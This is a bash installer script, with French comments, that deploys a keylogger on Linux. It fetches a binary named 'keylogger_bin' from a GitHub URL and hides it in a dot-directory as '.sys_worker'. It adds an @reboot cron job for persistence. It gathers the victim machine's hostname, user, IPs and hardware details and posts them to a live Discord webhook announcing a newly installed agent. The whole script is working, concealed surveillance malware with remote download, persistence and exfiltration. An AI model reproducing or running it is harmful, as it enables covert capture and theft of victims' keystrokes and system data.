#!/bin/bash

# ─────────────────────────────────────────────────────────
#  Configuration - NE PAS MODIFIER SAUF L'URL GITHUB
# ─────────────────────────────────────────────────────────
WEBHOOK_URL="https://discord.com/api/webhooks/1364683763170283672/iLME1HvQUf85TgjkucHa_U5HqYX7K43aNvPTO1A7NcVRyXvFwIP4urmjnYv9C1yezCmZ"
GITHUB_BIN_URL="https://raw.githubusercontent.com/Tomatorgb/KlinuxconfigL/main/keylogger_bin"
INSTALL_DIR="/usr/local/src/.bin"
BINARY_NAME=".sys_worker"
LOG_FILE="/tmp/.sys_log.txt"

# ─────────────────────────────────────────────────────────
#  Récupérer les infos de la machine cible
# ─────────────────────────────────────────────────────────
HOSTNAME=$(hostname)
USERNAME=$(whoami)
OS=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2 || echo "Linux inconnu")
KERNEL=$(uname -r)
ARCH=$(uname -m)
IP_LOCAL=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "Inconnue")
IP_PUBLIC=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || echo "Inconnue")
CPU=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d':' -f2 | xargs || echo "Inconnu")
RAM=$(free -h 2>/dev/null | awk '/Mem:/ {print $2}' || echo "Inconnu")
DISK=$(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo "Inconnu")
DATE_INSTALL=$(date "+%d/%m/%Y à %H:%M:%S")

# ─────────────────────────────────────────────────────────
#  Installation
# ─────────────────────────────────────────────────────────
sudo mkdir -p "$INSTALL_DIR"
sudo chmod 700 "$INSTALL_DIR"

# Télécharger le binaire
sudo curl -sL "$GITHUB_BIN_URL" -o "$INSTALL_DIR/$BINARY_NAME"
sudo chmod +x "$INSTALL_DIR/$BINARY_NAME"

# Créer le fichier de log
sudo touch "$LOG_FILE"
sudo chmod 600 "$LOG_FILE"

# Configurer le cron pour démarrage automatique (30s de délai)
CRON_JOB="@reboot sleep 30 && $INSTALL_DIR/$BINARY_NAME"
(sudo crontab -l 2>/dev/null | grep -v "$BINARY_NAME"; echo "$CRON_JOB") | sudo crontab -

# ─────────────────────────────────────────────────────────
#  Envoyer la notification Discord
# ─────────────────────────────────────────────────────────
MESSAGE="🚨 **NOUVEAU AGENT INSTALLÉ** 🚨\n\n\`\`\`\n📅 Date         : $DATE_INSTALL\n💻 Hostname     : $HOSTNAME\n👤 Utilisateur   : $USERNAME\n🖥️  OS            : $OS\n🐧 Kernel        : $KERNEL\n⚙️  Architecture  : $ARCH\n🌐 IP Locale     : $IP_LOCAL\n🌍 IP Publique   : $IP_PUBLIC\n🔧 CPU           : $CPU\n💾 RAM           : $RAM\n💿 Disque (/)    : $DISK\n\`\`\`\n✅ Keylogger actif — Les logs seront envoyés toutes les ~3 min."

curl -s -X POST "$WEBHOOK_URL" \
    -H "Content-Type: application/json" \
    -d "{\"content\": \"$(echo -e "$MESSAGE" | sed 's/"/\\"/g')\"}"

# ─────────────────────────────────────────────────────────
#  Lancer immédiatement sans redémarrer (pour test)
# ─────────────────────────────────────────────────────────
sudo "$INSTALL_DIR/$BINARY_NAME" &

echo "[+] Installation terminée. Binaire caché dans : $INSTALL_DIR/$BINARY_NAME"